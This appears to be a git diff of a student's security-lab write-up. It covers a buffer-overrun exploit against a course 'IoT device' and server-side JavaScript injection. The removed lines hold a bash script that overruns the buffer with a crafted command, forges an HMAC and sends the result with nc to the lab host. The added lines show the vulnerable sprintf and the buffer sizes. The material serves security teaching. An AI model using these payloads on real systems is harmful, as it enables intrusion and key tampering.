@@ -8,43 +8,28 @@ Using Google Chrome developer tools:
 
 
 ## Part B. Buffer overrun
-1) Save the message into a file `msg.in`.
-    - ```<user>;<command>;<hex_hmac><lf> > /tmp/msg.in```
-    - `<keyphrase>`: `??`, length `KEYLEN=20`
-    - `<user>`: `452056`
-    - `<command>`: `???`
-        - Include the exploit to overwrite `<keyphrase>` using buffer overrun.
-        - Expected input length is `MAXCMDLEN`.
-        -
-    - `<hex_hmac>`: HMAC in hexadecimal format using OpenSSL
-        - `openssl dgst -sha256 -hmac <keyphrase> /tmp/string.in`
-        - `/tmp/string.in` file contains: `ClientCmd|<user>|<command>`, where `ClientCmd` is a constant string. Expected to be of size `MAXHMACINPUTLEN`
-2) Send the command into the IoT device
-    - ```nc device1.vikaa.fi 33892 < /tmp/msg.in```
 
-Make this overrun
+```c
+#define KEYLEN 20
+#define MAXCMDLEN 18
+#define MAXUSERLEN 10
+#define CLIENTCMDTAG "ClientCmd"
+#define MAXHMACINPUTLEN (sizeof(CLIENTCMDTAG) + 1 + MAXCMDLEN + 1 + MAXUSERLEN) /* =40 */
+```
+
+```c
+char keyphrase[KEYLEN + 1] = {0};  // KEYLEN=20
+char hmac_input[MAXHMACINPUTLEN + 1] = {0};  // MAXHMACINPUTLEN=40
+```
+
 ```c
 sprintf(hmac_input, "%s|%s|%s", CLIENTCMDTAG, user_rec, command_rec);
 ```
-- `hmac_input` is allocated 40 characters
+- `hmac_input` 41 bytes allocated
 - `CLIENTCMDTAG` is 9 characters long
 - `user_rec` is 6 characters long
 - Two vertical bars `|` take 2 characters
 
-```bash
-# Keyphrase need to be 20 characters long.
-KEYPHRASE=01234567890123456789
-USERNAME=452056
-# Length of the command needs to make the buffer to overrun.
-# 22 characters + keyphrase
-COMMAND=0123456789012345678901${KEYPHRASE}
-
-echo "ClientCmd|${USERNAME}|${COMMAND}" > /tmp/string.in
-HEX_HMAC = $(openssl dgst -sha256 -hmac ${KEYPHRASE} /tmp/string.in)
-
-echo "${USERNAME};${COMMAND};${HEX_HMAC}" > /tmp/msg.in
-nc device1.vikaa.fi 33892 < /tmp/msg.in
-```
 
 ## Part C. Server-side poisoning
 ```js
@@ -73,7 +58,7 @@ bookshelf.knex.raw(sql_query).then(function(plants){
 });
 ```
 
-Inject javascript into the `sort by` field by adding options using developer tools.
+Inject javascript into the `sort by` field by adding options using developer tools. [@server_side_js_injection]
 
 1) List the contents of the current directory:
 
@@ -104,5 +89,3 @@ Inject javascript into the `sort by` field by adding options using developer too
     ```
 
 ## References
-
-https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_server_side_js_injection.html
